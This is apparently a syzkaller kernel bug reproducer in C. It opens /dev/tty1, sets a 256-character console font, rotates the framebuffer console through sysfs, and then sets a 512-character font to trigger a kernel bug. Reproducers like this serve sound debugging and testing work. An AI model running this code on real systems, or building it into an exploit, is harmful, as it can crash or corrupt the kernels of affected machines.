// https://syzkaller.appspot.com/bug?id=5f886ece82aef5036900b58b23aec039f5751d7d
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <linux/vt.h>
#include <errno.h>

int main(void) {
    int fd = open("/dev/tty1", O_RDWR);
    if (fd < 0) {
        printf("[-] Failed to open /dev/tty1: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] open /dev/tty1 successful.\n");

    // Activate the foreground console
    if (ioctl(fd, VT_ACTIVATE, 1) < 0) {
        printf("[-] Failed to VT_ACTIVATE: %s\n", strerror(errno));
    } else {
        printf("[+] VT_ACTIVATE successful.\n");
    }
    
    if (ioctl(fd, VT_WAITACTIVE, 1) < 0) {
        printf("[-] Failed to VT_WAITACTIVE: %s\n", strerror(errno));
    } else {
        printf("[+] VT_WAITACTIVE successful.\n");
    }

    // Enable software cursor
    const char *esc_seq = "\033[?18;0;0c";
    if (write(fd, esc_seq, strlen(esc_seq)) < 0) {
        printf("[-] Failed to write escape sequence: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] Enable software cursor successful.\n");

    // Set initial 256-character font
    struct console_font_op cfo = {0};
    cfo.op = KD_FONT_OP_SET;
    cfo.flags = 0;
    cfo.width = 8;
    cfo.height = 16;
    cfo.charcount = 256;
    unsigned char *font_data_256 = calloc(256, 32);
    if (!font_data_256) {
        printf("[-] Failed to allocate font_data_256\n");
        exit(1);
    }
    cfo.data = font_data_256;

    if (ioctl(fd, KDFONTOP, &cfo) < 0) {
        printf("[-] Failed to set 256-char font: %s\n", strerror(errno));
    } else {
        printf("[+] Set 256-char font successful.\n");
    }

    // Set screen rotation to Clockwise (1)
    int rot_fd = open("/sys/class/graphics/fbcon/rotate_all", O_WRONLY);
    if (rot_fd < 0) {
        printf("[-] Failed to open rotate_all: %s\n", strerror(errno));
    } else {
        if (write(rot_fd, "1", 1) < 0) {
            printf("[-] Failed to write to rotate_all: %s\n", strerror(errno));
        } else {
            printf("[+] Set rotation to CW successful.\n");
        }
        close(rot_fd);
    }

    // Trigger bug by setting a 512-character font
    cfo.charcount = 512;
    unsigned char *font_data_512 = calloc(512, 32);
    if (!font_data_512) {
        printf("[-] Failed to allocate font_data_512\n");
        exit(1);
    }
    cfo.data = font_data_512;

    if (ioctl(fd, KDFONTOP, &cfo) < 0) {
        printf("[-] Failed to set 512-char font: %s\n", strerror(errno));
    } else {
        printf("[+] Set 512-char font successful.\n");
    }

    close(fd);
    free(font_data_256);
    free(font_data_512);
    return 0;
}
